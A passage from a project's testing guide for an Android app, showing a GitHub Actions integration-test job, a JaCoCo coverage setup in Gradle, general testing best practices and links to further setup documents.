        path: APK/app/build/reports/jacoco/

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up JDK 11
      uses: actions/setup-java@v3
      with:
        java-version: '11'
        distribution: 'temurin'
        
    - name: Start test server
      run: |
        cd SERVER/simple-server
        npm install
        npm start &
        sleep 10
        
    - name: Run integration tests
      uses: reactivecircus/android-emulator-runner@v2
      with:
        api-level: 29
        script: |
          cd APK
          ./gradlew connectedAndroidTest
          
    - name: Upload integration test results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: integration-test-results
        path: APK/app/build/reports/androidTests/
```

### 2. Test Reporting and Analysis

#### Test Coverage Configuration (build.gradle)
```gradle
apply plugin: 'jacoco'

jacoco {
    toolVersion = "0.8.7"
}

task jacocoTestReport(type: JacocoReport, dependsOn: ['testDebugUnitTest']) {
    reports {
        xml.required = true
        html.required = true
    }
    
    def fileFilter = [
        '**/R.class',
        '**/R$*.class',
        '**/BuildConfig.*',
        '**/Manifest*.*',
        '**/*Test*.*',
        'android/**/*.*'
    ]
    
    def debugTree = fileTree(dir: "$project.buildDir/intermediates/javac/debug/classes", excludes: fileFilter)
    def mainSrc = "$project.projectDir/src/main/java"
    
    sourceDirectories.setFrom(files([mainSrc]))
    classDirectories.setFrom(files([debugTree]))
    executionData.setFrom(fileTree(dir: project.buildDir, includes: [
        'jacoco/testDebugUnitTest.exec',
        'outputs/code_coverage/debugAndroidTest/connected/**/*.ec'
    ]))
}
```

---

## Testing Best Practices

### 1. Test Organization
- **Follow AAA Pattern**: Arrange, Act, Assert
- **One Assertion Per Test**: Focus on single behavior
- **Descriptive Test Names**: Clearly indicate what is being tested
- **Independent Tests**: Each test should run independently

### 2. Test Data Management
- **Use Test Factories**: Create consistent test data
- **Mock External Dependencies**: Isolate units under test
- **Clean Up Resources**: Prevent test interference

### 3. Continuous Improvement
- **Regular Test Review**: Update tests as code evolves
- **Monitor Test Performance**: Keep test suite fast
- **Analyze Test Failures**: Learn from failure patterns

---

## Next Steps

After implementing comprehensive testing:

1. **Setup Production Server**: [10-SERVER_SETUP.md](10-SERVER_SETUP.md)
2. **Configure Deployment**: [11-DEPLOYMENT_GUIDE.md](11-DEPLOYMENT_GUIDE.md)
3. **Network Configuration**: [12-NETWORK_CONFIGURATION.md](12-NETWORK_CONFIGURATION.md)
4. **Performance Optimization**: [20-PERFORMANCE_METRICS.md](20-PERFORMANCE_METRICS.md)

---

## Academic Value

This comprehensive testing approach demonstrates:

- **Software Quality Assurance**: Industry-standard testing practices
- **Test-Driven Development**: Professional development methodologies  
- **Automated Testing**: CI/CD pipeline integration
- **Performance Analysis**: System optimization through testing
- **Security Testing**: Comprehensive security validation

Perfect for Harvard Computer Science coursework, showcasing professional testing practices and quality assurance methodologies used in enterprise software development.
